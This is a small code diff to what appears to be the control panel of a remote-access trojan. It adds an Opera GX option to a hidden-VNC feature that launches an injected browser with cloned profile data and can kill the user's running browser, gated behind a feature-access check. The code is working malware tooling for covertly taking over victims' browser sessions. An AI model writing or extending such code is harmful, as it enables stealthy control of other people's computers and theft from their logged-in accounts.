@@ -969,6 +969,11 @@ import { checkFeatureAccess } from "./feature-gate.js";
           const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
           const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
           sendCmd("hvnc_start_browser_injected", { browser: "firefox", clone, cloneLite, killIfRunning });
+        } else if (action === "start-opera-gx") {
+          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
+          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
+          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
+          sendCmd("hvnc_start_browser_injected", { browser: "opera-gx", clone, cloneLite, killIfRunning });
         } else if (action === "start-custom") {
           hideContextMenu();
           showCustomExeModal();
